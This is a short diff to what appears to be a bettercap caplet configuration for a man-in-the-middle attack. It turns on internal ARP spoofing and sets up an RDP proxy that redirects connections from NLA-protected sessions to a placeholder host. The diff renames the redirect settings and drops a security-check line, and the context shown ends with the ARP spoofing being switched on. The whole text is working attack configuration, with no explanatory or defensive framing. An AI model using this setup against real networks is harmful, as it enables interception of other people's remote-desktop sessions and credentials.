@@ -19,12 +19,10 @@ set arp.spoof.internal true
 #set arp.spoof.targets 192.168.0.50, 192.168.0.51
 #set rdp.proxy.targets 192.168.0.50
 
-# Setup NLA exploits
-set rdp.proxy.nla.seccheck ~/rdp-sec-check/rdp-sec-check.pl
+# Setup NLA redirect
 set rdp.proxy.nla.mode REDIRECT
-
-set rdp.proxy.nla.redirectip YOUR_NON_NLA_HOST
-set rdp.proxy.nla.redirectport 3389
+set rdp.proxy.nla.redirect.ip YOUR_NON_NLA_HOST
+set rdp.proxy.nla.redirect.port 3389
 
 # Start everything
 arp.spoof on
